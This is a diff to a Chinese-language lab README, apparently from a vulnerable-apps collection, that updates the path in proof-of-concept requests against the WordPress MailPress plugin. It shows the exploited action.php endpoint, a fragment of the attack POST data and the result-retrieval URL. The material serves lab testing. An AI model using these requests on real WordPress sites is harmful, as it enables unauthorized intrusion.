@@ -82,7 +82,7 @@ $ docker run -d -p 8000:80 medicean/vulapps:w_wordpress_2
 ### PoC 使用
 1. 使用攻击代码触发漏洞
  ```
-http://你的 IP 地址:端口号/wp-content/plugins/mailpress/mp-includes/action.php
+http://你的 IP 地址:端口号/wp-content/plugins/mailpress-5.4.2/mp-includes/action.php
  ```
 post data:
  ```
@@ -93,6 +93,6 @@ action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1
 2. 访问存在漏洞页面获取结果
 
  ```
-http://你的 IP 地址:端口号/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id=返回的文章id号
+http://你的 IP 地址:端口号/wp-content/plugins/mailpress-5.4.2/mp-includes/action.php?action=iview&id=返回的文章id号
 
  ```
